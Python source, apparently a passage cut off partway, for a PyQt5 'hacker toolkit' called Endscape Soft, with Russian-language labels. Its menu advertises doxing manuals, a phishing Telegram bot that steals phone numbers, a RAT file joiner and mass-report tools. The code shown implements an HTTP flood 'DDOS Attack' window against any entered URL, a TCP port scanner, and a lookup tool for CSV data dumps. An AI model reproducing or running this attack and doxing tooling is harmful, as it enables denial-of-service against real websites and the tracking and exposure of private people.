import base64
import ctypes
import csv
import json
import os
import platform
import psutil
import random
import requests
import shutil
import socket
import string
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
from telethon.sync import TelegramClient
from telethon.tl import types
from telethon import functions
from threading import Thread
from sys import platform as _platform
from PIL import Image, ImageGrab
from PIL.ExifTags import TAGS
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QTreeWidget, QTreeWidgetItem,
    QPushButton, QListWidget, QSlider, QLabel, QFileDialog, QAction, QSystemTrayIcon, QMenu,
    QProgressBar, QStyle, QMessageBox, QTableWidget, QTableWidgetItem, QCheckBox, QComboBox,
    QDialog, QDialogButtonBox, QFormLayout, QGridLayout, QLineEdit, QMainWindow, QSpinBox, QSplitter,
    QTabWidget, QTextEdit, QToolBar, QSizePolicy
)
from PyQt5 import QtWidgets, QtCore, QtGui, QtMultimedia, QtMultimediaWidgets

from PyQt5.QtMultimedia import QMediaPlayer, QMediaContent
from PyQt5.QtCore import Qt, QUrl, QTimer, QThread, pyqtSignal
from PyQt5.QtGui import QIcon, QDesktopServices, QFont
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWebEngineWidgets import (
    QWebEngineView, QWebEngineSettings, QWebEngineDownloadItem, QWebEnginePage
)
from faker import Faker
from phonenumbers import geocoder, carrier
import phonenumbers
import pyscreenshot as ImageGrabLinux
import pyperclip
import telebot
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup
import whois
from prettytable import PrettyTable
from zipfile import ZipFile, BadZipFile

version = "Endscape Soft 0.56.5"

background = "background-color: #0F0F1A; color: #65FFFF;"

background_index = "background-color: #0F0F1A;"

table_style = """
    background-color: #0F0F1A; 
    color: #65FFFF; 
    font-size: 12px; 
    border: 1px solid #65FFFF;
    border-radius: 5px;
    padding: 5px;
"""

tab_widget_style = """
    QTabWidget::pane {
        border: 2px solid #65FFFF;
        background-color: #0F0F1A;
        border-radius: 5px;
    }

    QTabBar::tab {
        background-color: #161625;
        color: #65FFFF;
        padding: 10px 20px;
        border: 2px solid #65FFFF;
        border-bottom: none;
        border-radius: 5px 5px 0 0;
        font-size: 11px;
    }

    QTabBar::tab:selected {
        background-color: #0F0F1A;
        color: #65FFFF;
        font-weight: bold;
    }

    QTabBar::tab:hover {
        background-color: #1C3A3A;
    }

    QTabBar::tab:!selected {
        background-color: #161625;
        color: #B0B0B0;
    }

    QTabBar::tab:!selected:hover {
        background-color: #1C3A3A;
    }
"""

container_style = """
    QWidget {
        background-color: #0F0F1A;
        color: #65FFFF;
    }

    QWidget::focus {
        border: 2px solid #65FFFF;
        border-radius: 5px;
    }
"""

table_style2 = """
    QHeaderView::section {
        background-color: #1C1C2B;
        color: #65FFFF;
        font-weight: bold;
        padding: 4px;
        border: 1px solid #65FFFF;
    }
"""

slider_style = """
            QSlider {
                background: transparent;
            }

            QSlider::groove:horizontal {
                height: 6px;
                background: #0F0F1A;
                border-radius: 3px;
            }

            QSlider::handle:horizontal {
                background: #65FFFF;
                border: 2px solid #161625;
                border-radius: 10px;
                width: 16px;
            }

            QSlider::handle:horizontal:hover {
                background: #1C3A3A;
            }
        """
progress_bar_style = """
    QProgressBar {
        background-color: #161625;
        border: 2px solid #65FFFF;
        border-radius: 5px;
        color: #65FFFF;
        font-size: 14px;
        text-align: center;
    }
    QProgressBar::chunk {
        background-color: #65FFFF;
        border-radius: 5px;
    }
"""

book_style = """
    QTextEdit {
        background-color: #161625;
        border: 2px solid #65FFFF;
        border-radius: 5px;
        color: #65FFFF;
        font-size: 14px;
    }
"""

list_style = """
    QListWidget {
        background-color: #161625;
        border: 2px solid #65FFFF;
        border-radius: 5px;
        color: #65FFFF;
        font-size: 14px;
    }
"""

button_style = """
    QPushButton {
        padding: 5px 10px;
        background-color: #0F0F1A;
        color: #65FFFF;
        border: 2px solid #65FFFF;
        border-radius: 12px;
        font-size: 16px;
    }
    QPushButton:hover {
        background-color: #1C3A3A;
    }
    QPushButton:pressed {
        background-color: #65FFFF;
        color: #0F0F1A;
    }
"""

info_button_style = """
    QPushButton {
        background-color: #1C1C2B;
        color: #65FFFF;
        border-radius: 10px;
        font-size: 16px;
        font-weight: bold;
    }
    QPushButton:hover {
        background-color: #1C3A3A;
    }
    QPushButton:pressed {
        background-color: #D74A75;
    }
"""

help_window_style = """
    QMessageBox {
        background-color: #0F0F1A;
        color: #65FFFF;
        font-size: 14px;
        font-family: Arial;
    }
    QTextEdit, QLabel {
        color: #65FFFF;
        font-size: 14px;
        font-family: Arial;
    }
    QPushButton {
        background-color: #0F0F1A;
        color: #65FFFF;
        border-radius: 5px;
        font-size: 14px;
        font-weight: bold;
    }
    QPushButton:hover {
        background-color: #1C3A3A;
    }
    QPushButton:pressed {
        background-color: #65FFFF;
    }
"""

text_input_style = """
    QTextEdit, QLineEdit {
        background-color: #65FFFF;
        border: 2px solid #009999;
        border-radius: 5px;
        color: #003333;
        font-size: 14px;
    }
    QTextEdit:focus, QLineEdit:focus {
        border: 2px solid #006666;
        outline: none;
        box-shadow: 0 0 5px 2px #66CCFF;
    }
"""


selector_style = """
    QComboBox {
        background-color: #161625;
        border: 2px solid #65FFFF;
        border-radius: 5px;
        color: #65FFFF;
        font-size: 14px;
    }
"""

output_style = """
    QTextEdit {
        background-color: #161625;
        border: 2px solid #65FFFF;
        border-radius: 5px;
        color: #65FFFF;
        font-size: 14px;
    }
"""

spinbox_style = """
    QSpinBox {
        background-color: #161625;
        border: 2px solid #65FFFF;
        border-radius: 5px;
        color: #65FFFF;
        font-size: 14px;
    }
    QSpinBox:focus {
        border: 2px solid #65FFFF;
    }
"""

tree_widget_style = """
    QTreeWidget {
        background-color: #161625;
        color: #65FFFF;
        border: 2px solid #65FFFF;
        border-radius: 5px;
        font-size: 14px;
    }

    QTreeWidget::item {
        background-color: #161625;
        color: #65FFFF;
    }

    QTreeWidget::item:hover {
        background-color: #1C3A3A;
    }

    QTreeWidget::branch {
        background-color: #161625;
        border: 1px solid #65FFFF;
    }
    QHeaderView::section {
        background-color: #161625;
        color: #65FFFF;
        font-weight: bold;
        padding: 4px;
        border: none;
    }
"""

splitter_style = """
    QSplitter::handle {
        background-color: #65FFFF;
        height: 2px;
        border: 1px solid #0F0F1A;
    }

    QSplitter::handle:hover {
        background-color: #1C3A3A;
    }
"""



class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(version)
        self.setWindowIcon(QtGui.QIcon("icon.ico"))
        self.setFixedSize(1220, 710)
        self.setGeometry(50, 50, 1220, 710)

        self.setStyleSheet(background_index)

        self.child_windows = []
        self.buttons = []
        self.info_buttons = []

        self.button_width = 320
        self.button_height = 50
        self.info_button_width = 50
        self.button_spacing = 80
        self.column_spacing = 20

        # Данные кнопок
        self.buttons_data = [
            ("Ctrl + V Spammer", self.open_copy_text_window,
             "Спаммер копирует в буфер обмена указанное тобой слово указанное количество раз"),
            (".CSV Searcher", self.open_csv_search_window, "Поиск информации в .csv базам данных"),
            ("Password Generator", self.open_password_generator_window, "Без комментариев.."),
            ("Code Encoder", self.open_multi_coder_window,
             "Кодирование и декодирование текста или файла ( .txt .csv .py)"),
            ("VPN Cheker (my ip info)", self.open_internet_info_window, "Информация о твоем ip"),
            ("DDOS Attack", self.open_ddos_attack_window, "DDOS атака"),
            ("Port Scanner", self.open_port_scanner_window, "Сканирование открытых портов"),
            ("Phone Searcher", self.open_phone_searcher_window, "Поиск информации по номеру телефона"),
            ("Manual Reader", self.open_manual_reader_window, "Чтение мануалов по доксу и другому :3"),
            ("IP Searcher", self.open_ip_searcher_window, "Поиск по IP"),
            ("Proxy_Finder", self.open_proxy_finder_window,
             "Поиск и отображение бесплатных прокси серверов: Адрес, порт и тип"),
            ("️Fake Person Generator", self.open_person_generator_window, "Генерация фейковой личности"),
            ("Fishing Telegram Bot Creator", self.open_tg_bot_window, "Создание фишинг бота, ворующего номер телефона"),
            ("Music Player", self.music_player, "Несложный проигрыватель музыки"),
            ("Mini IDE", self.mini_ide, "Среда разработки на python на крайний случай"),
            ("Mini Browser", self.open_browser_window, "Небольшой, быстрый и простой браузер"),
            ("VirusTotal Checker", self.openVTchecker, "Проверка файлов на вирусы (до 32мб)"),
            ("Metadata Parcer", self.openParceData, "Покажет метаданные фото, если они конечно есть)"),
            ("System Monitor", self.open_SystemMonitor, "Диспетчер задач, интернета, и устройств"),
            ("FileCoder Base64", self.FileEncoder_window, "Кодирует и декодирует любой файл в base64"),
            ("File Unsplitter For RAT", self.open_file_unsplitter_window, "Соединяет разделенные файлы с моего ратника в .zip архив"),
            ("Snossers", self.open_snoser_menu_window, "Сносеры с графическим интерфейсом, будет обновлятся)"),
            ("More Programs", self.open_more_programs, "Надеюсь тебе тут что то понравится <3")
        ]

        self.create_buttons()

    def create_buttons(self):
        for name, func, info in self.buttons_data:
            button = QtWidgets.QPushButton(name, self)
            button.clicked.connect(func)
            button.setStyleSheet(button_style)
            button.setGraphicsEffect(QtWidgets.QGraphicsDropShadowEffect(
                blurRadius=10, color=QtGui.QColor(0, 0, 0, 150), offset=QtCore.QPoint(0, 0)))

            button.enterEvent = lambda event, btn=button: self.animate_button(btn, True)
            button.leaveEvent = lambda event, btn=button: self.animate_button(btn, False)
            self.buttons.append(button)

            info_button = QtWidgets.QPushButton("?", self)
            info_button.clicked.connect(lambda _, text=info: self.show_info(text))
            info_button.setStyleSheet(info_button_style)
            self.info_buttons.append(info_button)

        self.arrange_buttons()

    def animate_button(self, button, hover):
        animation = QtCore.QPropertyAnimation(button, b"geometry")
        animation.setDuration(200)

        rect = button.geometry()
        if hover:
            rect.setWidth(rect.width() + 10)
            rect.setHeight(rect.height() + 5)
        else:
            rect.setWidth(self.button_width)
            rect.setHeight(self.button_height)

        animation.setEndValue(rect)
        animation.start()

    def arrange_buttons(self):
        available_width = self.width()
        total_button_width = (
                self.button_width + self.info_button_width + self.column_spacing
        )
        max_buttons_per_column = self.height() // self.button_spacing

        columns = max(1, available_width // total_button_width)

        for index, (button, info_button) in enumerate(zip(self.buttons, self.info_buttons)):
            column = index // max_buttons_per_column
            row = index % max_buttons_per_column

            x_main_button = 50 + column * total_button_width
            y_position = 50 + row * self.button_spacing

            button.setGeometry(
                x_main_button, y_position, self.button_width, self.button_height
            )

            info_button.setGeometry(
                x_main_button + self.button_width + 10,
                y_position,
                self.info_button_width,
                self.button_height,
            )

    def resizeEvent(self, event):
        self.arrange_buttons()
        super().resizeEvent(event)

    def closeEvent(self, event):
        for window in self.child_windows:
            if window.isVisible():
                window.close()
        super().closeEvent(event)

    def show_info(self, info):
        msg = QtWidgets.QMessageBox(self)
        msg.setWindowTitle("Info")
        msg.setStyleSheet(help_window_style)
        msg.setText(info)
        msg.exec_()

    def open_child_window(self, window_class):
        for window in self.child_windows:
            if isinstance(window, window_class):
                window.close()

        window = window_class()
        self.child_windows.append(window)
        window.show()

    def open_copy_text_window(self):
        self.open_child_window(CopyTextWindow)

    def open_csv_search_window(self):
        self.open_child_window(CSVSearchWindow)

    def open_password_generator_window(self):
        self.open_child_window(PasswordGeneratorWindow)

    def open_multi_coder_window(self):
        self.open_child_window(MultiCoder)

    def open_internet_info_window(self):
        self.open_child_window(internet_info)

    def open_ddos_attack_window(self):
        self.open_child_window(DDOS_Attack)

    def open_port_scanner_window(self):
        self.open_child_window(PortScanner)

    def FileEncoder_window(self):
        self.open_child_window(FileEncoder)

    def open_phone_searcher_window(self):
        self.open_child_window(PhoneSearcher)

    def open_SystemMonitor(self):
        self.open_child_window(SystemMonitor)

    def open_more_programs(self):
        self.open_child_window(More_Programs)

    def music_player(self):
        self.music_window = MusicPlayer()
        self.music_window.show()

    def openVTchecker(self):
        self.open_child_window(VirusTotalChecker)

    def openParceData(self):
        self.open_child_window(MetadataParserApp)

    def mini_ide(self):
        self.ide_window = MiniIDE()
        self.ide_window.show()

    def open_manual_reader_window(self):
        self.open_child_window(Manual_Reader)

    def open_ip_searcher_window(self):
        self.open_child_window(IPSearch)

    def open_proxy_finder_window(self):
        self.open_child_window(ProxyFinder)

    def open_person_generator_window(self):
        self.open_child_window(FakePersonGenerator)

    def open_browser_window(self):
        self.browser_window = Browser()
        self.browser_window.show()

    def open_tg_bot_window(self):
        self.TG_Bot_window = TG_Bot()
        self.TG_Bot_window.show()

    def open_file_unsplitter_window(self):
        self.open_child_window(FileJoinerApp)

    def open_snoser_menu_window(self):
        self.snos_window = Snossers()
        self.snos_window.show()

    def copy_tg_link(self):
        pyperclip.copy("https://t.me/Endscape_coding")
        QtWidgets.QMessageBox.information(
            self,
            "Скопировано!",
            "Скопировано!!! У меня в канале в будущем ты найдешь еще больше полезных программ",
        )


class CopyTextWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Ctrl + V Spammer by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)

        self.setStyleSheet(background)

        self.label1 = QtWidgets.QLabel("Введите слово для спама:", self)
        self.label1.setGeometry(50, 30, 300, 20)
        self.label1.setStyleSheet("font-size: 14px; font-weight: bold;")

        self.text_input = QtWidgets.QLineEdit(self)
        self.text_input.setGeometry(50, 60, 300, 30)
        self.text_input.setStyleSheet(text_input_style)

        self.label2 = QtWidgets.QLabel("Количество повторений:", self)
        self.label2.setGeometry(50, 100, 300, 20)
        self.label2.setStyleSheet("font-size: 14px; font-weight: bold;")

        self.count_input = QtWidgets.QSpinBox(self)
        self.count_input.setGeometry(50, 130, 100, 30)
        self.count_input.setRange(1, 1000000000)
        self.count_input.setStyleSheet(spinbox_style)

        self.copy_button = QtWidgets.QPushButton("Копировать", self)
        self.copy_button.setGeometry(50, 180, 142, 30)
        self.copy_button.clicked.connect(self.copy_to_clipboard)
        self.copy_button.setStyleSheet(button_style)

        self.result_label = QtWidgets.QLabel("", self)
        self.result_label.setGeometry(50, 230, 300, 30)
        self.result_label.setStyleSheet("font-size: 12px; color: #FFAAAA;")

    def copy_to_clipboard(self):
        text = self.text_input.text()
        count = self.count_input.value()
        result = (text + "\n") * count
        clipboard = QtWidgets.QApplication.clipboard()
        clipboard.setText(result.strip())
        self.result_label.setText("Скопировано!")


class CSVSearchWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(".CSV Searcher by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)

        self.setStyleSheet(background)

        self.label = QtWidgets.QLabel("Введите значение для поиска:", self)
        self.label.setGeometry(50, 30, 300, 20)
        self.label.setStyleSheet("font-size: 14px; font-weight: bold;")

        self.phone_input = QtWidgets.QLineEdit(self)
        self.phone_input.setGeometry(50, 60, 300, 30)
        self.phone_input.setStyleSheet(text_input_style)

        self.load_button = QtWidgets.QPushButton("Выбрать файлы CSV", self)
        self.load_button.setGeometry(50, 110, 180, 30)
        self.load_button.clicked.connect(self.load_csv)
        self.load_button.setStyleSheet(button_style)

        self.result_label = QtWidgets.QLabel("", self)
        self.result_label.setGeometry(50, 160, 300, 200)
        self.result_label.setWordWrap(True)

    def load_csv(self):
        phone = self.phone_input.text()
        if not phone:
            self.result_label.setText("Введите значение для поиска.")
            return

        options = QtWidgets.QFileDialog.Options()
        filepaths, _ = QtWidgets.QFileDialog.getOpenFileNames(
            self, "Выбрать CSV файлы", "", "CSV Files (*.csv)", options=options
        )

        if not filepaths:
            return

        found = False

        try:
            for filepath in filepaths:
                with open(filepath, mode="r", encoding="utf-8") as file:
                    reader = csv.reader(file)
                    for row in reader:
                        if phone in row:
                            self.result_label.setText(
                                f"Найдено в файле {filepath}: {', '.join(row)}"
                            )
                            txt = f"Найдено в файле {filepath}: {', '.join(row)}"
                            reply = QMessageBox.question(
                                self,
                                "Вопрос",
                                "Скопировать результат?",
                                QMessageBox.Yes | QMessageBox.No,
                                QMessageBox.No,
                            )

                            if reply == QMessageBox.Yes:
                                pyperclip.copy(txt)
                                QMessageBox.information(
                                    None, "Скопировано!", "Результат скопирован!"
                                )
                            else:
                                print("Пользователь не захотел копировать.")
                            found = True
                            break
                if found:
                    break

            if not found:
                self.result_label.setText("Ничего не найдено в выбранных файлах.")
        except Exception as e:
            self.result_label.setText(f"Ошибка: {str(e)}")


class PasswordGeneratorWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Password_Generator by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setFixedSize(400,300)

        self.setStyleSheet(background)

        self.label1 = QtWidgets.QLabel("Количество символов в пароле:", self)
        self.label1.setGeometry(50, 30, 300, 20)
        self.label1.setStyleSheet("font-size: 14px; font-weight: bold;")

        self.length_input = QtWidgets.QSpinBox(self)
        self.length_input.setGeometry(50, 60, 100, 30)
        self.length_input.setRange(4, 128)
        self.length_input.setStyleSheet(spinbox_style)

        self.label2 = QtWidgets.QLabel("Количество букв:", self)
        self.label2.setGeometry(50, 100, 300, 20)
        self.label2.setStyleSheet("font-size: 14px; font-weight: bold;")

        self.letters_input = QtWidgets.QSpinBox(self)
        self.letters_input.setGeometry(50, 130, 100, 30)
        self.letters_input.setRange(0, 128)
        self.letters_input.setStyleSheet(spinbox_style)

        self.generate_button = QtWidgets.QPushButton("Сгенерировать пароль", self)
        self.generate_button.setGeometry(50, 180, 210, 35)
        self.generate_button.clicked.connect(self.generate_password)
        self.generate_button.setStyleSheet(button_style)

        self.result_label = QtWidgets.QLabel("", self)
        self.result_label.setGeometry(50, 230, 300, 50)
        self.result_label.setWordWrap(True)
        self.result_label.setStyleSheet("font-size: 14px; font-weight: bold;")

    def generate_password(self):
        length = self.length_input.value()
        letters_count = self.letters_input.value()

        if letters_count > length:
            self.result_label.setText(
                "Количество букв не может превышать длину пароля."
            )
            return

        letters = "".join(random.choices(string.ascii_letters, k=letters_count))
        digits = "".join(random.choices(string.digits, k=length - letters_count))
        password = "".join(random.sample(letters + digits, k=length))
        self.result_label.setText(f"Пароль: {password}")
        reply = QMessageBox.question(
            self,
            "Вопрос",
            "Скопировать сгенерированный пароль??",
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No,
        )

        if reply == QMessageBox.Yes:
            pyperclip.copy(password)
            QMessageBox.information(None, "Скопировано!", "Скпировано!")
            print("Скопировано!")
        else:
            print("Эх, ну ладно")


class MultiCoder(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MultiCoder by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setStyleSheet(background)
        self.init_ui()

    def init_ui(self):
        central_widget = QWidget(self)
        layout = QGridLayout(central_widget)

        self.label_input = QLabel("Введите текст или выберите файл:")
        layout.addWidget(self.label_input, 0, 0, 1, 2)
        self.label_input.setStyleSheet(
            "font-size: 14px; font-weight: bold; color: white;"
        )

        self.input_field = QTextEdit()
        self.input_field.setPlaceholderText(
            "Введите текст для кодирования или декодирования..."
        )
        layout.addWidget(self.input_field, 1, 0, 1, 2)
        self.input_field.setStyleSheet(text_input_style)

        self.file_button = QPushButton("Выбрать файл")
        self.file_button.clicked.connect(self.load_file)
        layout.addWidget(self.file_button, 2, 0, 1, 2)
        self.file_button.setStyleSheet(button_style)

        self.label_encoding = QLabel("Выберите кодировку:")
        layout.addWidget(self.label_encoding, 3, 0)
        self.label_encoding.setStyleSheet(
            "font-size: 14px; font-weight: bold; color: white;"
        )

        self.encoding_selector = QComboBox()
        self.encoding_selector.addItems(["Base32", "Base64", "Hex"])
        layout.addWidget(self.encoding_selector, 3, 1)
        self.encoding_selector.setStyleSheet(selector_style)

        self.reverse_checkbox = QCheckBox("Разворачивать текст перед операцией")
        self.reverse_checkbox.setStyleSheet("font-size: 12px; color: white;")
        layout.addWidget(self.reverse_checkbox, 4, 0, 1, 2)

        self.encode_button = QPushButton("Кодировать")
        self.encode_button.setMinimumHeight(40)
        self.encode_button.clicked.connect(self.encode_text)
        layout.addWidget(self.encode_button, 5, 0)
        self.encode_button.setStyleSheet(button_style)

        self.decode_button = QPushButton("Декодировать")
        self.decode_button.setMinimumHeight(40)
        self.decode_button.clicked.connect(self.decode_text)
        layout.addWidget(self.decode_button, 5, 1)
        self.decode_button.setStyleSheet(button_style)

        self.output_field = QTextEdit()
        self.output_field.setPlaceholderText("Результат...")
        self.output_field.setReadOnly(True)
        layout.addWidget(self.output_field, 6, 0, 1, 2)
        self.output_field.setStyleSheet(output_style)

        layout.setRowStretch(1, 3)
        layout.setRowStretch(6, 3)
        layout.setColumnStretch(0, 1)
        layout.setColumnStretch(1, 1)

        self.setCentralWidget(central_widget)

    def load_file(self):
        """Загрузка текста из файла."""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Выберите файл", "", "Text Files (*.txt *.csv *.py)"
        )
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as file:
                    content = file.read()
                self.input_field.setPlainText(content)
            except Exception as e:
                QMessageBox.critical(self, "Ошибка", f"Не удалось загрузить файл: {e}")

    def encode_text(self):
        """Кодирование текста."""
        input_text = self.input_field.toPlainText().strip()
        selected_encoding = self.encoding_selector.currentText()

        if not input_text:
            QMessageBox.warning(self, "Ошибка", "Введите текст для кодирования!")
            return

        try:
            if self.reverse_checkbox.isChecked():
                input_text = input_text[::-1]

            if selected_encoding == "Base32":
                result = base64.b32encode(input_text.encode("utf-8")).decode("utf-8")
            elif selected_encoding == "Base64":
                result = base64.b64encode(input_text.encode("utf-8")).decode("utf-8")
            elif selected_encoding == "Hex":
                result = input_text.encode("utf-8").hex()
            else:
                raise ValueError("Неизвестная кодировка!")
            self.output_field.setPlainText(result)
        except Exception as e:
            QMessageBox.critical(
                self, "Ошибка кодирования", f"Не удалось закодировать текст: {e}"
            )

    def decode_text(self):
        """Декодирование текста."""
        input_text = self.input_field.toPlainText().strip()
        selected_encoding = self.encoding_selector.currentText()

        if not input_text:
            QMessageBox.warning(self, "Ошибка", "Введите текст для декодирования!")
            return

        try:
            if selected_encoding == "Base32":
                result = base64.b32decode(input_text).decode("utf-8")
            elif selected_encoding == "Base64":
                result = base64.b64decode(input_text).decode("utf-8")
            elif selected_encoding == "Hex":
                result = bytes.fromhex(input_text).decode("utf-8")
            else:
                raise ValueError("Неизвестная кодировка!")

            if self.reverse_checkbox.isChecked():
                result = result[::-1]

            self.output_field.setPlainText(result)
        except Exception as e:
            QMessageBox.critical(
                self, "Ошибка декодирования", f"Не удалось декодировать текст: {e}"
            )


class internet_info(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("VPN_Cheker (my ip info) by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setMinimumSize(200, 300)
        self.setStyleSheet(background)

        self.info_label = QLabel(
            "Нажмите кнопку, чтобы получить информацию о вашем IP.", self
        )
        self.info_label.setWordWrap(True)
        self.info_label.setFont(QFont("Epilepsy Sans", 22))  # Увеличение шрифта
        self.info_label.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)

        self.fetch_button = QPushButton("Получить данные", self)
        self.fetch_button.setFont(
            QFont("Epilepsy Sans", 18)
        )
        self.fetch_button.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Preferred)
        self.fetch_button.setMinimumHeight(50)
        self.fetch_button.clicked.connect(self.fetch_ip_info)
        self.fetch_button.setStyleSheet(button_style)

        layout = QVBoxLayout()
        layout.addWidget(self.info_label)
        layout.addWidget(self.fetch_button)

        self.setLayout(layout)

    def fetch_ip_info(self):
        try:
            response = requests.get("https://ipinfo.io/json")
            data = response.json()

            ip = data.get("ip", "Неизвестно")
            city = data.get("city", "Неизвестно")
            region = data.get("region", "Неизвестно")
            country = data.get("country", "Неизвестно")
            org = data.get("org", "Неизвестно")

            info_text = (
                f"IP-адрес: {ip}\n"
                f"Город: {city}\n"
                f"Регион: {region}\n"
                f"Страна: {country}\n"
                f"Организация: {org}"
            )

            self.info_label.setText(info_text)
            self.info_label.setStyleSheet(
                """
                QTextEdit {
                    background-color: #2E2E2E;
                    border: 2px solid #FF5555;
                    border-radius: 5px;
                    color: white;
                    font-size: 14px;
                }
            """
            )
        except Exception as e:
            self.info_label.setText(f"Ошибка при получении данных: {e}")


class DDOS_Attack(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.stop_flag = False

    def init_ui(self):
        # Настройка окна
        self.setWindowTitle("DDOS Attacker by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)
        self.setMinimumSize(400, 300)
        self.setStyleSheet(background)

        self.url_label = QLabel("Введите URL сайта:")
        self.url_label.setFont(QFont("Arial", 14))
        self.url_input = QLineEdit()
        self.url_input.setFont(QFont("Arial", 14))
        self.url_input.setPlaceholderText("https://example.com")
        self.url_input.setStyleSheet(text_input_style)

        self.request_label = QLabel("Количество запросов:")
        self.request_label.setFont(QFont("Arial", 14))
        self.request_count = QSpinBox()
        self.request_count.setFont(QFont("Arial", 14))
        self.request_count.setRange(1, 1000000)
        self.request_count.setStyleSheet(spinbox_style)

        self.delay_label = QLabel("Задержка между запросами (в секундах):")
        self.delay_label.setFont(QFont("Arial", 14))
        self.delay_input = QLineEdit()
        self.delay_input.setFont(QFont("Arial", 14))
        self.delay_input.setPlaceholderText("0.5")
        self.delay_input.setStyleSheet(text_input_style)

        self.start_button = QPushButton("Начать DDOS")
        self.start_button.setFont(QFont("Arial", 14))
        self.start_button.clicked.connect(self.start_test)
        self.start_button.setStyleSheet(button_style)

        self.stop_button = QPushButton("Остановить DDOS")
        self.stop_button.setFont(QFont("Arial", 14))
        self.stop_button.clicked.connect(self.stop_test)
        self.stop_button.setStyleSheet(self.start_button.styleSheet())

        self.result_label = QLabel("")
        self.result_label.setFont(QFont("Arial", 12))
        self.result_label.setWordWrap(True)
        self.result_label.setAlignment(Qt.AlignTop)
        self.result_label.setStyleSheet(output_style)

        layout = QVBoxLayout()
        layout.addWidget(self.url_label)
        layout.addWidget(self.url_input)
        layout.addWidget(self.request_label)
        layout.addWidget(self.request_count)
        layout.addWidget(self.delay_label)
        layout.addWidget(self.delay_input)
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)
        layout.addWidget(self.result_label)

        self.setLayout(layout)

    def start_test(self):
        reply = QMessageBox.question(
            self,
            "Внимание",
            "DDOS атака запрещена законом (хоть ддос и слабый но все же..). Вы уверены, что хотите продолжить?",
            QMessageBox.Yes | QMessageBox.No,
            QMessageBox.No,
        )

        if reply != QMessageBox.Yes:
            return

        self.stop_flag = False
        url = self.url_input.text()
        num_requests = self.request_count.value()
        try:
            delay = float(self.delay_input.text())
        except ValueError:
            self.result_label.setText("Ошибка: задержка должна быть числом.")
            return

        if not url:
            self.result_label.setText("Ошибка: введите URL.")
            return

        self.result_label.setText("Начинаем атаку...")

        thread = threading.Thread(target=self.run_test, args=(url, num_requests, delay))
        thread.start()

    def stop_test(self):
        self.stop_flag = True
        self.result_label.setText("Остановка DDOS...")

    def run_test(self, url, num_requests, delay):
        success_count = 0
        fail_count = 0

        for i in range(num_requests):
            if self.stop_flag:
                self.update_result_label(
                    f"Атака остановлена. Успешно: {success_count}, Ошибки: {fail_count}"
                )
                return

            try:
                requests.get(url)
                success_count += 1
            except Exception:
                fail_count += 1

            time.sleep(delay)

        self.update_result_label(
            f"Атака завершена! Успешно: {success_count}, Ошибки: {fail_count}"
        )

    def update_result_label(self, text):
        self.result_label.setText(text)


class PortScannerThread(QThread):
    progress = pyqtSignal(str)
    finished = pyqtSignal(list)

    def __init__(self, host, start_port, end_port):
        super().__init__()
        self.host = host
        self.start_port = start_port
        self.end_port = end_port
        self.open_ports = []

    def run(self):
        try:
            target_ip = socket.gethostbyname(self.host)
        except socket.gaierror:
            self.progress.emit("Ошибка: Невозможно разрешить хост.")
            self.finished.emit([])
            return

        for port in range(self.start_port, self.end_port + 1):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    result = s.connect_ex((target_ip, port))
                    if result == 0:
                        self.open_ports.append(port)
                        self.progress.emit(f"Порт {port}: открыт")
                    else:
                        self.progress.emit(f"Порт {port}: закрыт")
            except Exception as e:
                self.progress.emit(f"Ошибка на порту {port}: {e}")

        self.finished.emit(self.open_ports)


class PortScanner(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        # Настройка окна
        self.setWindowTitle("Port Scanner by Endscape")
        self.setWindowIcon(QIcon("icon.ico"))
        self.setGeometry(200, 200, 400, 300)

        self.setStyleSheet(background)

        label_font = QFont("Arial", 14)
        input_font = QFont("Arial", 12)
        button_font = QFont("Arial", 16, QFont.Bold)

        self.label_host = QLabel("Введите хост или IP-адрес:", self)
        self.label_host.setFont(label_font)
        self.label_host.setStyleSheet(text_input_style)

        self.input_host = QLineEdit(self)
        self.input_host.setFont(input_font)
        self.input_host.setPlaceholderText("Например: 127.0.0.1 или www.example.com")
        self.input_host.setStyleSheet(text_input_style)

        self.label_ports = QLabel("Диапазон портов:", self)
        self.label_ports.setFont(label_font)
        self.label_ports.setStyleSheet("font-size: 12px; color: #FFAAAA;")

        self.start_port = QSpinBox(self)
        self.start_port.setRange(1, 65535)
        self.start_port.setValue(1)
        self.start_port.setFont(input_font)
        self.start_port.setStyleSheet(spinbox_style)

        self.end_port = QSpinBox(self)
        self.end_port.setRange(1, 65535)
        self.end_port.setValue(1024)
        self.end_port.setFont(input_font)
        self.end_port.setStyleSheet(self.start_port.styleSheet())

        self.scan_button = QPushButton("Сканировать", self)
        self.scan_button.setFont(button_font)
        self.scan_button.setStyleSheet(button_style)
        self.scan_button.clicked.connect(self.start_scan)

